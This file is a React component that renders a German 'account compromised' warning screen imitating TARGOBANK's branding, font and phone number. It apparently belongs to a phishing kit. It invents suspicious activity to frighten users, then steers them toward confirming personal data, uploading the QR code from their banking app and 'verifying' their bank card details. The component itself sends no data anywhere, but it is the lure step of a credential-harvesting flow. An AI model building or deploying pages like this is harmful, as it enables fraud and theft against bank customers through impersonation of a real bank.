import React, { useState, useEffect } from 'react';
import { AlertTriangle, Shield, Lock, Phone } from 'lucide-react';

interface AccountCompromisedScreenProps {
  onContinue: () => void;
}

const AccountCompromisedScreen: React.FC<AccountCompromisedScreenProps> = ({ onContinue }) => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  return (
    <div style={{
      backgroundColor: '#f8f9fa',
      minHeight: '80vh',
      padding: isMobile ? '40px 20px' : '80px 40px',
      fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
    }}>
      <div style={{
        maxWidth: '800px',
        margin: '0 auto'
      }}>
        {/* Warning Banner */}
        <div style={{
          backgroundColor: '#fff3cd',
          border: '2px solid #ffc107',
          borderRadius: '12px',
          padding: isMobile ? '24px' : '32px',
          marginBottom: '32px',
          display: 'flex',
          alignItems: 'flex-start',
          gap: '20px'
        }}>
          <div style={{
            backgroundColor: '#ffc107',
            borderRadius: '50%',
            padding: '12px',
            flexShrink: 0
          }}>
            <AlertTriangle size={32} color="#000" />
          </div>
          <div>
            <h2 style={{
              color: '#856404',
              fontSize: isMobile ? '20px' : '24px',
              fontWeight: 'bold',
              margin: '0 0 12px 0',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Sicherheitswarnung: Verdächtige Aktivität erkannt
            </h2>
            <p style={{
              color: '#856404',
              fontSize: isMobile ? '14px' : '16px',
              margin: '0',
              lineHeight: '1.6',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Wir haben ungewöhnliche Aktivitäten in Ihrem Konto festgestellt. Zu Ihrer Sicherheit müssen wir Ihre Identität verifizieren, bevor Sie fortfahren können.
            </p>
          </div>
        </div>

        {/* Main Content */}
        <div style={{
          backgroundColor: 'white',
          borderRadius: '12px',
          padding: isMobile ? '30px 24px' : '40px 48px',
          boxShadow: '0 8px 32px rgba(0, 0, 0, 0.1)'
        }}>
          <h1 style={{
            color: '#003366',
            fontSize: isMobile ? '28px' : '36px',
            fontWeight: '900',
            margin: '0 0 24px 0',
            textAlign: 'center',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Konto-Verifizierung erforderlich
          </h1>

          <p style={{
            color: '#666',
            fontSize: isMobile ? '16px' : '18px',
            lineHeight: '1.6',
            margin: '0 0 32px 0',
            textAlign: 'center',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Um Ihr Konto zu schützen, benötigen wir eine zusätzliche Verifizierung Ihrer Identität.
          </p>

          {/* Security Features */}
          <div style={{
            display: 'grid',
            gridTemplateColumns: isMobile ? '1fr' : '1fr 1fr 1fr',
            gap: '20px',
            marginBottom: '32px'
          }}>
            <div style={{
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              padding: '24px',
              textAlign: 'center'
            }}>
              <div style={{
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                backgroundColor: '#e3f2fd',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 16px'
              }}>
                <Shield size={28} color="#003366" />
              </div>
              <h3 style={{
                color: '#003366',
                fontSize: '16px',
                fontWeight: 'bold',
                margin: '0 0 8px 0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Sichere Daten
              </h3>
              <p style={{
                color: '#666',
                fontSize: '14px',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                256-Bit Verschlüsselung
              </p>
            </div>

            <div style={{
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              padding: '24px',
              textAlign: 'center'
            }}>
              <div style={{
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                backgroundColor: '#e3f2fd',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 16px'
              }}>
                <Lock size={28} color="#003366" />
              </div>
              <h3 style={{
                color: '#003366',
                fontSize: '16px',
                fontWeight: 'bold',
                margin: '0 0 8px 0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Datenschutz
              </h3>
              <p style={{
                color: '#666',
                fontSize: '14px',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                DSGVO-konform
              </p>
            </div>

            <div style={{
              backgroundColor: '#f8f9fa',
              borderRadius: '8px',
              padding: '24px',
              textAlign: 'center'
            }}>
              <div style={{
                width: '60px',
                height: '60px',
                borderRadius: '50%',
                backgroundColor: '#e3f2fd',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 16px'
              }}>
                <Phone size={28} color="#003366" />
              </div>
              <h3 style={{
                color: '#003366',
                fontSize: '16px',
                fontWeight: 'bold',
                margin: '0 0 8px 0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                Support
              </h3>
              <p style={{
                color: '#666',
                fontSize: '14px',
                margin: '0',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
              }}>
                24/7 erreichbar
              </p>
            </div>
          </div>

          {/* Steps */}
          <div style={{
            backgroundColor: '#e3f2fd',
            borderRadius: '8px',
            padding: '24px',
            marginBottom: '32px'
          }}>
            <h3 style={{
              color: '#003366',
              fontSize: '18px',
              fontWeight: 'bold',
              margin: '0 0 16px 0',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
            }}>
              Verifizierungsschritte:
            </h3>
            <ol style={{
              color: '#333',
              fontSize: '16px',
              margin: '0',
              paddingLeft: '24px',
              fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
              lineHeight: '2'
            }}>
              <li>Persönliche Daten bestätigen</li>
              <li>QR-Code aus der App hochladen (optional)</li>
              <li>Bankkarten-Daten verifizieren</li>
            </ol>
          </div>

          {/* Continue Button */}
          <div style={{
            display: 'flex',
            justifyContent: 'center'
          }}>
            <button
              onClick={onContinue}
              style={{
                backgroundColor: '#c20831',
                color: 'white',
                border: 'none',
                borderRadius: '50px',
                padding: isMobile ? '16px 40px' : '18px 50px',
                fontSize: isMobile ? '16px' : '18px',
                fontWeight: 'bold',
                fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif',
                cursor: 'pointer',
                transition: 'all 0.3s ease',
                minWidth: isMobile ? '280px' : '320px',
                boxShadow: '0 6px 20px rgba(194, 8, 49, 0.3)'
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = '#a91e2c';
                e.currentTarget.style.transform = 'translateY(-2px)';
                e.currentTarget.style.boxShadow = '0 8px 25px rgba(194, 8, 49, 0.4)';
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = '#c20831';
                e.currentTarget.style.transform = 'translateY(0)';
                e.currentTarget.style.boxShadow = '0 6px 20px rgba(194, 8, 49, 0.3)';
              }}
            >
              Verifizierung starten
            </button>
          </div>
        </div>

        {/* Contact Info */}
        <div style={{
          marginTop: '32px',
          textAlign: 'center',
          padding: '20px',
          backgroundColor: 'white',
          borderRadius: '8px',
          border: '1px solid #e0e0e0'
        }}>
          <p style={{
            color: '#666',
            fontSize: '14px',
            margin: '0',
            fontFamily: 'TARGOBANK, Helvetica Neue, Helvetica, Arial, sans-serif'
          }}>
            Bei Fragen erreichen Sie uns unter:{' '}
            <a href="tel:0211-900-20-111" style={{ color: '#003366', textDecoration: 'none', fontWeight: 'bold' }}>
              0211 - 900 20 111
            </a>
          </p>
        </div>
      </div>
    </div>
  );
};

export default AccountCompromisedScreen;

